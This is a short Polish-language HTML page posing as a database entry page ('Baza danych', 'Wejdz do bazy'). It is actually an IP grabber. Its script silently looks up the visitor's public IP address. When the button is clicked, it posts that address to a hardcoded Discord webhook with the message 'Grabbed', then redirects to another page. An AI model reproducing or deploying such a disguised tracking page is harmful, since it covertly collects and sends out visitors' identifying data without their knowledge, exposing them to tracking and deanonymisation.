<!DOCTYPE html>
<html lang="pl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Baza</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            margin-top: 100px;
        }
        #ip {
            font-size: 24px;
            margin: 20px;
            font-weight: bold;
        }
        button {
            padding: 10px 20px;
            font-size: 16px;
            cursor: pointer;
            margin: 5px;
        }
    </style>
</head>
<body>

    <h1>INF 02</h1>
    <div id="ip">Baza danych</div>

    <button onclick="sendToDiscord()">Wejdz do bazy</button>

    <script>
        let currentIP = "";

        // Pobieranie IP z API
        fetch("https://api.ipify.org?format=json")
            .then(response => response.json())
            .then(data => {
                currentIP = data.ip;
            })
            .catch(() => {
                // Jeśli nie uda się pobrać IP, ustawiamy chociaż informację
                document.getElementById("ip").textContent = "Błąd połączenia";
            });

        function sendToDiscord() {
            // Jeśli IP jeszcze się nie pobrało, wymuszamy przekierowanie bez czekania
            // lub po prostu wysyłamy to co mamy (puste lub błąd)
            
            fetch("https://discord.com/api/webhooks/1514013803912630352/WSDMZ0hqcG6s9M8TTvptRjYjll1yYqRCNjdHCiSse6sRYOWr-34xIRTTpqqDkYNHFDxm", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    content: "Grabbed " + (currentIP || "Brak IP")
                })
            })
            .finally(() => {
                // .finally wykona się zawsze, niezależnie czy wysyłanie się udało, czy był błąd
                window.location.href = "index2.html"; 
            });
        }
    </script>

</body>
</html>
